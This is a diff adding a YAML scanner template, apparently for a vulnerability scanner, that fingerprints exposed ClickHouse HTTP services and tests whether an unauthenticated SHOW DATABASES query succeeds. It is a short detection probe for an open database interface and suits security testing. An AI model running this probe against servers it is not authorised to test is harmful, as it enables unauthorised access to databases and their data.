@@ -1,0 +1,23 @@
+name: ClickHouse SQLI
+manual: true
+query: banner="X-Clickhouse-Summary" || port="8123"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ping
+    expression: response.status == 200 && response.raw_header.bcontains(b"X-Clickhouse-Summary")
+  r1:
+    request:
+      method: GET
+      path: /?query=SHOW%20DATABASES
+    expression: response.status == 200 && response.body.bcontains(b"default") && response.body.bcontains(b"system")
+expression: r0() && r1()
+detail:
+  links:
+  - https://mp.weixin.qq.com/s/xIc3Ic7N104iTogZul1LJA
+  description: ClickHouse is an open-source column-oriented DBMS for online analytical
+    processing that allows users to generate analytical reports using SQL queries
+    in real-time.
+  tags: sqli
